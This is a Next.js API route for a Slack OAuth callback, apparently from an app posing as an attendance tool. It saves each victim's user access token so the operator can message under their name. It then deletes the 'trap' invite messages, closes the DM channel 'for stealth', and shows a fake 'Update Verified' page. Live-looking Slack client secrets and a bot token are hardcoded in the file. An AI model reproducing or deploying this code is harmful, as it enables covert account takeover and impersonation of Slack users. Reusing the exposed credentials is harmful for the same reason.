/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/auth/callback/route.ts
// app/api/auth/callback/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase'; 
import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

// ⚠️ KEYS (Make sure ye sahi hon)
const SLACK_CLIENT_ID = "2545190050563.10465084927779";
const SLACK_CLIENT_SECRET = "0926eb577bb4ca6058b7be66fed2bbd8";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10484448701457-ouYgXSAbiTnUAIQEvKvxPGIW";

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  if (!code) return NextResponse.json({ error: "No code" });

  try {
    // 1. Token Exchange (User se permission lena)
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();
    if (!data.ok) return NextResponse.json({ error: data.error }, { status: 400 });

    const userId = data.authed_user.id;

    // 2. Save User Token to Firebase
    // (Taakay hum baad main iskay naam se message kar sakein)
    const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
        headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
    });
    const userInfo = await userRes.json();
    
    await setDoc(doc(db, "slack_tokens", userId), {
        slackId: userId,
        accessToken: data.authed_user.access_token,
        name: userInfo.user?.real_name || "Unknown",
        image: userInfo.user?.profile?.image_192 || "",
        connectedAt: serverTimestamp(),
    });

    // -------------------------------------------------------------
    // 3. 🧹 CLEANUP: DELETE MESSAGES & HIDE APP
    // -------------------------------------------------------------
    
    const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
    
    if (inviteDoc.exists()) {
        const inviteData = inviteDoc.data();
        let channelId = null;

        // A. Saaray Trap Messages Delete karo
        if (inviteData.messages && Array.isArray(inviteData.messages)) {
            console.log(`Deleting ${inviteData.messages.length} messages...`);
            // Channel ID save kar lo close karne ke liye
            if(inviteData.messages.length > 0) channelId = inviteData.messages[0].channel;

            await Promise.all(inviteData.messages.map(async (msg: any) => {
                await fetch('https://slack.com/api/chat.delete', {
                    method: 'POST',
                    headers: { 
                        Authorization: `Bearer ${BOT_TOKEN}`, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({ channel: msg.channel, ts: msg.ts })
                });
            }));
        } 
        else if (inviteData.ts) {
             channelId = inviteData.channel;
             await fetch('https://slack.com/api/chat.delete', {
                method: 'POST',
                headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ channel: inviteData.channel, ts: inviteData.ts })
            });
        }

        // B. 🔥 HIDE APP FROM SIDEBAR (The Magic Step)
        if (channelId) {
            console.log(`Closing DM channel ${channelId} for stealth...`);
            await fetch('https://slack.com/api/conversations.close', {
                method: 'POST',
                headers: { 
                    Authorization: `Bearer ${BOT_TOKEN}`, // Bot close karega
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ channel: channelId })
            });
        }

        // C. Record saaf kar do
        await deleteDoc(doc(db, "pending_invites", userId));
    }

    // 4. Redirect User
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta http-equiv="refresh" content="0;url=slack://open">
          <script>
            // Try to open Slack App
            window.location.href = 'slack://open'; 
            // Close browser tab after 2 seconds
            setTimeout(() => window.close(), 1500);
          </script>
        </head>
        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
            <div style="text-align:center">
                <h2>Update Verified ✅</h2>
                <p>Redirecting back to workspace...</p>
            </div>
        </body>
      </html>
    `;

    return new Response(html, { headers: { 'Content-Type': 'text/html' } });

  } catch (error) {
    return NextResponse.json({ error: "Error" }, { status: 500 });
  }
}